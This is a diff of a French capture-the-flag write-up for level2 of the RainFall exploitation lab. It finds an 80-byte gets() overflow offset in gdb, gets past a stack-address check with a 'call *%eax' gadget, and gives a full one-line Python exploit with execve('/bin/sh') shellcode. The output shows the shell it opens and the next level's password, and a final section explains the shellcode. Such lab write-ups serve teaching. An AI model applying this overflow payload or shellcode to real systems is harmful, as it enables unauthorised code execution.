@@ -5,87 +5,110 @@
 /_/\___/|___/\___/_//____/
 
 
+>$ level2@RainFall:~$ ./level2
+   AAAAA
+   AAAAA
+
 On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard.
 
-On constate de nouveau la présence de la fonction gets().  Or comme stipulée précédemment cette 
-dernière est sujet à une faille que nous pouvons exploiter via un “buffer overflow”.
+>$ objdump -d level2
 
-Calculons la taille du buffer (EIP - start of buffer)
+Comme d'habitude on consate un <main> ainsi qu'une fonction <p>, celle ci est appelée dans le <main>.
 
-$> (gdb) x $ebp-0x4c
-0xbffff69c:	 'A' <repeats 12 times>
+On constate de nouveau la présence de la fonction gets() au sein de <p>. Or comme stipulée dans le level1 : cette dernière est sujet à une faille que 
+nous pouvons exploiter via un bufferoverflow.
 
-$> (gdb) info frame
-Stack level 0, frame at 0xbffff6f0:
- …
- Saved registers:
-  ebp at 0xbffff6e8, eip at 0xbffff6ec
+Calculons la taille du buffer cette fois ci à l'aide du site web : https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
 
-$>(gdb) p/d 0xbffff6ec - 0xbffff69c
-$1 = 80
+(gdb) r
+Starting program: /home/user/level2/level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad
 
-On a donc un offset de 80.
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
 
-Cependant il ne sera pas possible de procéder de la meme façon qu’avant, en effet on peut voir 
-que EIP SAVED est soumise à une verification :
+On trouve en entrant 0x37634136 dans le site web un offset de 80, qui correspond à la taille de notre buffer.
+
+Cependant il ne sera pas possible de procéder de la meme façon qu’au level1, en effet on peut voir que l'EIP SAVED est soumise à une verification :
 
 $> (gdb) disas p
 
-0x080484f2 <+30>:	mov     0x4(%ebp),%eax			(1) EIP SAVED (ebp + 0x4) est stockée dans EAX
-….
-0x080484fb <+39>:	and     $0xb0000000,%eax		(2) Operation logique 
-0x08048500 <+44>:	cmp     $0xb0000000,%eax 		(3) Comparaison
-0x08048505 <+49>:	jne     0x8048527 <p+83>
-….
-0x08048522 <+78>:	call    0x80483d0 <_exit@plt>	(4) Exit
-0x08048527 <+83>:	lea    -0x4c(%ebp),%eax 
+    0x080484f2 <+30>:	mov     0x4(%ebp),%eax			(1) EIP SAVED (ebp + 0x4) est stockée dans EAX
+    ….
+    0x080484fb <+39>:	and     $0xb0000000,%eax		(2) Operation logique 
+    0x08048500 <+44>:	cmp     $0xb0000000,%eax 		(3) Comparaison
+    0x08048505 <+49>:	jne     0x8048527 <p+83>
+    ….
+    0x08048522 <+78>:	call    0x80483d0 <_exit@plt>	(4) Exit
+    0x08048527 <+83>:	lea    -0x4c(%ebp),%eax 
 
-Cette verification nous rends impossible la réécriture de EIP SAVED par une adresse de la stack 
-car toute les adresses de la stack sont de la forme 0xbXXXXXXX, ce qu’on peut voir ici:
+
+Cette verification (2)&(3) nous rends impossible la réécriture de EIP SAVED par une adresse de la stack car toute les adresses de la stack 
+sont de la forme 0xbXXXXXXX, ce qu’on peut voir ici:
 
 $> (gdb) info proc map
 
-Start Addr 	End Addr          Size               Offset objfile
-0xbffdf000 	0xc0000000    0x21000        0x0 [stack]
+Start Addr 	   End Addr      Size       Offset objfile
+0xbffdf000 	   0xc0000000    0x21000    0x0 [stack]
+
 
 On remarque, en mettant un break  sur le return de la fonction <p> que notre registre EAX contient 
 l’adresse de notre buffer :
 
-$> disas
-…
-      0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
-      0x0804853d <+105>:	leave
-      0x0804853e <+106>:	ret
-End of assembler dump.
+$> (gdb) disas p
+    …
+    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
+    0x0804853d <+105>:	leave
+    0x0804853e <+106>:	ret
 
 $> (gdb) i r eax
-eax            0x804a008	134520840
+    eax            0x804a008	134520840
 
 $> (gdb) x/s 0x804a008
-0x804a008:	 "This is my input"
+    0x804a008:	 "This is my input"
 
-Il serait donc possible d’exécuter un shellcode contenu dans notre buffer si nous pouvions 
-réécrire EIP SAVED avec l’adresse d’une instruction faisant appel à EAX.
+Il serait donc possible d’exécuter un shellcode contenu dans notre buffer via notre input si nous pouvions réécrire EIP SAVED avec l’adresse d’une instruction 
+faisant appel à EAX.
 
 Cherchons l’adresse d’une instruction hors stack qui fait appel au registre EAX :
 
-level2@RainFall:~$ objdump -d level2 | grep 'call' | grep 'eax'
- 
- 8048488:	ff 14 85 50 97 04 08 	call   *0x8049750(,%eax,4)
- 80484cf:	ff d0                	call   *%eax
- 80485eb:	ff d0                	call   *%eax
+>$ level2@RainFall:~$ objdump -d level2 | grep 'call' | grep 'eax'
+    
+    8048488:	ff 14 85 50 97 04 08 	call   *0x8049750(,%eax,4),
+    80484cf:	ff d0                	call   *%eax
+    80485eb:	ff d0                	call   *%eax
 
 Nous utiliserons 080484cf.
 
-Nous avons notre offset (80), l’adresse d’une instruction qui appelle EAX (80484cf), un shellcode … Let’s do it :
+Nous avons notre offset 80, l’adresse d’une instruction qui appelle EAX 80484cf, un shellcode execve(/bin/sh) trouver sur exploit-db … Let’s do it :
 
 
-level2@RainFall:~$ (python -c 'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 59 * "A" + "\xcf\x84\x04\x08")'; cat) | ./level2
-1���Qh//shh/bin��
+>$ level2@RainFall:~$ (python -c 'print("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + 59 * "A" + "\xcf\x84\x04\x08")'; cat) | ./level2
+    1���Qh//shh/bin��
                   ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAτ
-whoami
-level3
-cat /home/user/level3/.pass
-492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+    whoami
+    level3
+    cat /home/user/level3/.pass
+    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+    
+
+EXPLICATION DU SHELLCODE :
+
+Nous allons expliqué ici le shellcode que nous avons trouver sur exploit-db.com : https://www.exploit-db.com/exploits/36857.
+Ce dernier permet l'execution de execve(/bin/sh).
+Il sera le shellcode utilisé par defaut pour la suite du projet.
+
+0:  31 c9                 xor    ecx,ecx     ;; ecx = 0
+2:  f7 e1                 mul    ecx         ;; eax = eax * ecx (set eax to 0)
+4:  51                    push   ecx         ;; push 0 on stack (string end)
+5:  68 2f 2f 73 68        push   0x68732f2f  ;; push "//sh" on stack
+a:  68 2f 62 69 6e        push   0x6e69622f  ;; push "/bin" on stack
+f:  89 e3                 mov    ebx,esp     ;; ebx = esp (esp = @"/bin//sh\0")
+11: b0 0b                 mov    al,0xb      ;; eax = 0xb (sys_call_execve)
+13: cd 80                 int    0x80        ;; call execve("/bin//sh")
+15: 51                    push   ecx         ;; push 0 on stack
+16: b0 01                 mov    al,0x1      ;; eax = 1 (sys_call_exit)
+18: cd 80                 int    0x80        ;; call exit(ebx)
 
 Next …
